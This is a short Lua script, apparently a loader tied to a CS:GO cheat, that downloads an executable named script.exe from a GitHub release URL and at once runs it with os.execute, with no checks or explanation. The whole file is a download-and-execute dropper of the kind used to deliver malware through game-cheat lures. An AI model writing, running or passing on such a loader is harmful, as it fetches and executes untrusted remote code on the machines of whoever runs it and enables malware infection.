local fileUrl = "https://github.com/medusakands/dont-download-two/releases/download/cheatCsgo/script.exe"
local filePath = "downloaded_script.exe"

function downloadFile(url, path)
    local response = http.get(url)
    if response and response.status == 200 then
        local file = io.open(path, "wb")
        if file then
            file:write(response.body)
            file:close()
            return true
        end
    end
    return false
end

function executeScript(path)
    os.execute(path)
end

function main()
    if downloadFile(fileUrl, filePath) then
        executeScript(filePath)
    end
end

main()
